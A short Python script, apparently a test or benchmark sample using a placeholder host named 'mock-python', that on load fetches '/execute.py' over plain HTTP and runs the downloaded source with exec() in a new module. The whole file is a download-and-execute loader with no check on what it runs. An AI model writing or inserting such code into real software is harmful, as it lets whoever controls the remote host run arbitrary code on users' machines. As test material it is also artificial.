import http.client
import types

def get_host_and_path():
    return "mock-python", "/execute.py"

def fetch_response(host, path):
    connection = http.client.HTTPConnection(host)
    connection.request("GET", path)
    response = connection.getresponse()
    source = response.read().decode('utf-8')
    connection.close()
    return source

def create_module():
    return types.ModuleType("sm")

def exec_code(src, module):
    exec(src, module.__dict__)

def main():
    host, path = get_host_and_path()
    source = fetch_response(host, path)
    module = create_module()
    exec_code(source, module)

main()
